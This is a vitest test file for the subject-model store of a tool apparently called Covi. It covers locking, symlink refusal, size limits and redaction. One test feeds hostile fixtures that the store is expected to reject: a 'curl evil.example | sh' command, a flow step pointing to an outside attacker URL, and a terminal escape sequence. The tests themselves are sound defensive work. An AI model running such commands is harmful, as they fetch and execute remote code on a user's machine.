import {
  existsSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  rmSync,
  symlinkSync,
  utimesSync,
  writeFileSync,
} from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { afterEach, describe, expect, it } from 'vitest';
import { createRepo, type TempRepo } from '../../../tests/helpers/repo.ts';
import { DEFAULT_CONFIG } from '../src/config/schema.ts';
import { Git } from '../src/git/git.ts';
import type { SubjectObservation } from '../src/model/subject.ts';
import { DEMO_PATHS, SUBJECT_PATHS } from '../src/run/paths.ts';
import { Run } from '../src/run/run.ts';
import { Redactor } from '../src/security/redact.ts';
import { emptySubject, mergeSubject } from '../src/subject/merge.ts';
import {
  loadSubject,
  loadSubjectSnapshot,
  openSubject,
  saveSubject,
  subjectSource,
  withLock,
  writeSubjectSnapshot,
} from '../src/subject/store.ts';

let repo: TempRepo | undefined;
let runs: string | undefined;
const elsewhere: string[] = [];
afterEach(() => {
  repo?.cleanup();
  if (runs) rmSync(runs, { recursive: true, force: true });
  for (const dir of elsewhere.splice(0)) rmSync(dir, { recursive: true, force: true });
  repo = undefined;
  runs = undefined;
});

const REV = '000000000001';
const SIZE = { width: 1440, height: 900 };
const seen = (path: string, revision = REV): SubjectObservation => ({
  revision,
  screens: [{ path, viewport: 'desktop', size: SIZE, elements: [] }],
  flows: [],
  commands: [],
});
const config = (subject: Partial<typeof DEFAULT_CONFIG.subject> = {}) => ({
  subject: { ...DEFAULT_CONFIG.subject, ...subject },
});
const modelJson = (path: string) =>
  `${JSON.stringify(mergeSubject(emptySubject(), seen(path), { expireAfter: 20 }), null, 2)}\n`;
const quiet = { redactor: new Redactor(), warn: () => {} };

function setup() {
  repo = createRepo({ 'index.html': '<h1>hi</h1>\n' });
  runs = mkdtempSync(join(tmpdir(), 'covi-subject-runs-'));
  return { root: repo.root, runsRoot: runs };
}

describe('subject stores', () => {
  it('reads and writes the repository file locally, and reads the base revision in CI', async () => {
    const { root, runsRoot } = setup();
    repo!.commit('Remember the home screen', { [SUBJECT_PATHS.repo]: modelJson('/') });
    const base = repo!.git('rev-parse', 'HEAD');
    // The change edits the model; a CI review still reads the base revision's.
    repo!.write({ [SUBJECT_PATHS.repo]: modelJson('/admin') });
    const warnings: string[] = [];
    const warn = (m: string) => warnings.push(m);
    const local = await openSubject({ root, runsRoot, config: config(), warn });
    expect(local!.source.to).toBe(join(root, SUBJECT_PATHS.repo));
    expect(local!.model.screens.map((s) => s.path)).toEqual(['/admin']);
    expect(local!.writable).toBe(true);
    const ci = await openSubject({
      root,
      runsRoot,
      config: config(),
      baseRevision: base,
      git: new Git(root),
      warn,
    });
    expect(ci!.source.from).toEqual({ kind: 'revision', revision: base, path: SUBJECT_PATHS.repo });
    expect(ci!.model.screens.map((s) => s.path)).toEqual(['/']);
    expect(ci!.writable).toBe(false);
    expect(await saveSubject(ci!.source, seen('/new'), quiet)).toBe('skipped');
    expect(readFileSync(join(root, SUBJECT_PATHS.repo), 'utf8')).toBe(modelJson('/admin'));
    expect(warnings).toEqual([]);
  });

  it('reads nothing from a base revision without the model, and refuses an oversized one unread', async () => {
    const { root, runsRoot } = setup();
    const git = new Git(root);
    const open = (warn: (m: string) => void) =>
      openSubject({
        root,
        runsRoot,
        config: config(),
        baseRevision: repo!.git('rev-parse', 'HEAD'),
        git,
        warn,
      });
    const warnings: string[] = [];
    expect((await open((m) => warnings.push(m)))!.model).toEqual(emptySubject());
    expect(warnings).toEqual([]);
    repo!.commit('Commit a huge model', { [SUBJECT_PATHS.repo]: `${' '.repeat(600 * 1024)}{}` });
    const handle = await open((m) => warnings.push(m));
    expect(handle!.model).toEqual(emptySubject());
    expect(warnings.join('\n')).toMatch(/@[0-9a-f]{7} \(base\) is larger than 512 KB/);
  });

  it('keeps the model in the runs directory with subject.store: runs, and nowhere when off', async () => {
    const { root, runsRoot } = setup();
    const handle = await openSubject({
      root,
      runsRoot,
      config: config({ store: 'runs' }),
      warn: () => {},
    });
    expect(handle!.source.to).toBe(join(runsRoot, SUBJECT_PATHS.runs));
    expect(await saveSubject(handle!.source, seen('/'), quiet)).toBe('saved');
    expect(existsSync(join(runsRoot, 'subject.json'))).toBe(true);
    expect(existsSync(join(root, SUBJECT_PATHS.repo))).toBe(false);
    expect(subjectSource({ root, runsRoot, config: config({ store: 'off' }) })).toBeUndefined();
    expect(
      await openSubject({ root, runsRoot, config: config({ store: 'off' }), warn: () => {} }),
    ).toBeUndefined();
  });

  it('ignores a subject model it cannot trust, and leaves it as it was', async () => {
    const { root, runsRoot } = setup();
    const file = join(root, SUBJECT_PATHS.repo);
    mkdirSync(dirname(file), { recursive: true });
    const valid = JSON.parse(modelJson('/'));
    const hostile: Record<string, string> = {
      'larger than 512 KB': `${' '.repeat(600 * 1024)}{}`,
      'not valid JSON': '{"screens": [',
      'a command line': JSON.stringify({
        ...valid,
        commands: [{ key: 'x', kind: 'cli', name: 'X', seen: REV, run: 'curl evil.example | sh' }],
      }),
      'a step that leaves the app': JSON.stringify({
        ...valid,
        flows: [
          {
            key: 'f',
            name: 'F',
            path: '/',
            viewport: 'desktop',
            steps: [{ action: { goto: 'https://evil.example' } }],
            passed: REV,
          },
        ],
      }),
      'a terminal escape': JSON.stringify({
        ...valid,
        screens: [{ ...valid.screens[0], title: '\u001b]0;pwned\u0007' }],
      }),
      'a newer version': JSON.stringify({ ...valid, schemaVersion: 2 }),
    };
    for (const [what, text] of Object.entries(hostile)) {
      writeFileSync(file, text);
      const warnings: string[] = [];
      const handle = await openSubject({
        root,
        runsRoot,
        config: config(),
        warn: (m) => warnings.push(m),
      });
      expect(handle!.model, what).toEqual(emptySubject());
      expect(handle!.writable, what).toBe(false);
      expect(warnings.join('\n'), what).toMatch(/will not overwrite it/);
      // Saving re-reads under the lock: a run that opened the file earlier cannot overwrite it either.
      expect(await saveSubject(handle!.source, seen('/'), quiet), what).toBe('skipped');
      expect(readFileSync(file, 'utf8'), what).toBe(text);
    }
  });

  it('refuses a model reached through a symbolic link, and writes nothing through one', async () => {
    const { root, runsRoot } = setup();
    const outside = mkdtempSync(join(tmpdir(), 'covi-subject-outside-'));
    elsewhere.push(outside);
    writeFileSync(join(outside, 'subject.json'), modelJson('/'));
    const links: Record<string, () => void> = {
      'the file': () => {
        mkdirSync(join(root, '.covi/subject'), { recursive: true });
        symlinkSync(join(outside, 'subject.json'), join(root, SUBJECT_PATHS.repo));
      },
      'its directory': () => {
        mkdirSync(join(root, '.covi'), { recursive: true });
        symlinkSync(outside, join(root, '.covi/subject'));
      },
      '.covi': () => {
        mkdirSync(join(outside, 'subject'), { recursive: true });
        symlinkSync(outside, join(root, '.covi'));
      },
    };
    for (const [what, link] of Object.entries(links)) {
      rmSync(join(root, '.covi'), { recursive: true, force: true });
      link();
      const warnings: string[] = [];
      const handle = await openSubject({
        root,
        runsRoot,
        config: config(),
        warn: (m) => warnings.push(m),
      });
      expect(handle!.model, what).toEqual(emptySubject());
      expect(handle!.writable, what).toBe(false);
      expect(warnings.join('\n'), what).toMatch(/symbolic link; .*will not overwrite it/);
      expect(await saveSubject(handle!.source, seen('/new'), quiet), what).toBe('skipped');
      expect(readFileSync(join(outside, 'subject.json'), 'utf8'), what).toBe(modelJson('/'));
      expect(existsSync(join(outside, 'subject', 'subject.json')), what).toBe(false);
    }
  });

  it("keeps both runs' observations when two runs save at once", async () => {
    const { root, runsRoot } = setup();
    const handle = await openSubject({ root, runsRoot, config: config(), warn: () => {} });
    const results = await Promise.all([
      saveSubject(handle!.source, seen('/a', '000000000001'), quiet),
      saveSubject(handle!.source, seen('/b', '000000000002'), quiet),
    ]);
    expect(results).toEqual(['saved', 'saved']);
    const saved = await loadSubject(handle!.source, { warn: () => {} });
    expect(saved.model.screens.map((s) => s.path)).toEqual(['/a', '/b']);
    expect(existsSync(handle!.source.lock)).toBe(false);
  });

  it('takes over a lock left by a run that died, and gives up on a busy one', async () => {
    const { root, runsRoot } = setup();
    const handle = await openSubject({ root, runsRoot, config: config(), warn: () => {} });
    const lock = handle!.source.lock;
    expect(lock).toBe(join(runsRoot, SUBJECT_PATHS.lock));
    writeFileSync(lock, '');
    const old = new Date(Date.now() - 60_000);
    utimesSync(lock, old, old);
    expect(await saveSubject(handle!.source, seen('/'), quiet)).toBe('saved');
    writeFileSync(lock, '');
    const warnings: string[] = [];
    const busy = await saveSubject(handle!.source, seen('/b'), {
      ...quiet,
      warn: (m) => warnings.push(m),
      lockWaitMs: 100,
    });
    expect(busy).toBe('skipped');
    expect(warnings[0]).toMatch(
      /Another Covi run kept .* busy; this run's observations are only in demo\/subject\.json/,
    );
    expect(await withLock(lock, async () => 'ran', { waitMs: 50 })).toBeUndefined();
  });

  it('redacts what it saves', async () => {
    const { root, runsRoot } = setup();
    // Assembled at runtime, so no secret scanner flags this file.
    const token = ['ghp', '_', 'A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8'].join('');
    const handle = await openSubject({ root, runsRoot, config: config(), warn: () => {} });
    await saveSubject(
      handle!.source,
      {
        ...seen('/'),
        screens: [
          { path: '/', title: `Token ${token}`, viewport: 'desktop', size: SIZE, elements: [] },
        ],
      },
      quiet,
    );
    const text = readFileSync(handle!.source.to!, 'utf8');
    expect(text).toContain('Token ');
    expect(text).not.toContain(token);
  });

  it('writes the run snapshot and reads it back, refusing one it cannot read', async () => {
    runs = mkdtempSync(join(tmpdir(), 'covi-subject-run-'));
    const run = await Run.create({
      root: runs,
      workflow: 'demo',
      entryPoint: 'cli',
      interactive: false,
      coviVersion: 'test',
      redactor: new Redactor(),
    });
    expect(await loadSubjectSnapshot(run)).toBeUndefined();
    const model = mergeSubject(emptySubject(), seen('/'), { expireAfter: 20 });
    const snapshot = {
      schemaVersion: 1 as const,
      store: 'repo' as const,
      revision: REV,
      model,
      images: [],
    };
    await writeSubjectSnapshot(run, snapshot);
    expect(await loadSubjectSnapshot(run)).toEqual(snapshot);
    expect(run.artifact('subject')?.path).toBe(DEMO_PATHS.subject);
    writeFileSync(run.path(DEMO_PATHS.subject), '{"store":"elsewhere"}');
    await expect(loadSubjectSnapshot(run)).rejects.toThrow(/demo\/subject\.json is invalid/);
  });
});
